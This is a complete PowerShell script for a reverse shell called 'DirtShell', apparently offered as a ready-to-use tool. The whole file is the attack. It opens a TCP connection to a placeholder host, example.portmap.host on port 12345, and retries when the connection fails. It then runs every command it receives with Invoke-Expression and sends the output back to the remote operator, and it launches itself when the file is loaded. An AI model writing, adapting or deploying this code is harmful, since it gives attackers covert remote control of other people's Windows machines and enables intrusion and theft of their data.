class DirtShell {

    [string]$address = "example.portmap.host"
    [int]$port = 12345

    $connection

    $channel
    $stream_buffer
    $text_encoding

    $stream_writer
    $stream_reader

    [int]$max_fail_limit = 3
    [int]$max_tcp_retry_limit = 3
    [int]$max_chunk_limit = 250
    [int]$max_chunk_size = 4096

    [int]$total_fail_count = 0

    DirtShell() {
        $this.init_tcp_connection()
        $this.run_interactive_shell()
    }

    init_tcp_connection() {
        [int]$tcp_retry_count = 0
        $this.connection = $false

        if ($this.total_fail_count -ge $this.max_fail_limit) {
            throw "The max failure limit '$this.max_fail_limit' was reached!"
        }

        while ($true) {
            if ($tcp_retry_count -ge $this.max_tcp_retry_limit) {
                throw "The max retry limit '$this.max_tcp_retry_limit' was reached!"
            }

            try {
                $this.connection = New-Object Net.Sockets.TcpClient($this.address, $this.port)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }

            $tcp_retry_count++
        }

        $this.open_tcp_io_streams()
    }

    open_tcp_io_streams() {
        $this.channel = $this.connection.GetStream()
        $this.stream_buffer = New-Object Byte[] $this.max_chunk_size
        $this.text_encoding = New-Object Text.UTF8Encoding

        $this.stream_writer = New-Object IO.StreamWriter($this.channel, [Text.Encoding]::UTF8, $this.max_chunk_size)
        $this.stream_reader = New-Object System.IO.StreamReader($this.channel)
        $this.stream_writer.AutoFlush = $true
    }

    write_data_to_tcp_stream($text_data_to_send) {
        try {
            $this.stream_writer.WriteLine($text_data_to_send)
        } catch [Exception] {
            $this.total_fail_count++
            $this.init_tcp_connection()
        }
    }

    [string] read_data_from_tcp_stream() {
        try {
            [int]$chunk_count = 0
            $full_decoded_read_data = New-Object System.Text.StringBuilder

            while ($true) {
                if ($chunk_count -ge $this.max_chunk_limit) {
                    throw "The max chunk count limit '$this.max_chunk_limit' was reached!"
                }

                $encoded_read_bytes = $this.channel.Read($this.stream_buffer, 0, $this.max_chunk_size)
                if ($encoded_read_bytes -eq 0) {
                    break
                }

                $decoded_read_chunk = $this.text_encoding.GetString($this.stream_buffer, 0, $encoded_read_bytes)
                $full_decoded_read_data.Append($decoded_read_chunk) | Out-Null

                $chunk_count++
            }
        } catch {
            $this.total_fail_count++
            $this.init_tcp_connection()

            return ""
        }

        return $full_decoded_read_data.ToString()
    }

    [string] execute_powershell_command($command_to_execute) {
        Write-Host $command_to_execute

        try {
            $command_output = Invoke-Expression $command_to_execute | Out-String
        }
        catch {
            $command_output = "`n$_`n"
        }

        return $command_output
    }

    [string] get_shell_prompt() {
        $current_username = [Environment]::UserName
        $current_hostname = [System.Net.Dns]::GetHostName()
        $current_working_directory = Get-Location

        return "$current_username@$current_hostname [$current_working_directory]~$ "
    }

    run_interactive_shell() {
        try {
            while ($this.connection.Connected) {
                $this.write_data_to_tcp_stream($this.get_shell_prompt())

                $decoded_read_bytes = $this.read_data_from_tcp_stream()
                if ([string]::IsNullOrEmpty($decoded_read_bytes)) {
                    continue
                }

                $command_output = $this.execute_powershell_command($decoded_read_bytes)

                $this.write_data_to_tcp_stream($command_output + "`n")
                $this.channel.Flush()
            }
        } catch {
            Write-Output "Exception Type: $_.Exception.GetType().FullName"
            Write-Output "StackTrace: $_.Exception.StackTrace"
            Write-Output "Exception Message: $_.Exception.Message"

            Write-Host "Exiting..." -ForegroundColor Red -ErrorAction Stop
        } finally {
            $this.connection.Close()
        }
    }
}

$dirt_shell = [DirtShell]::new()
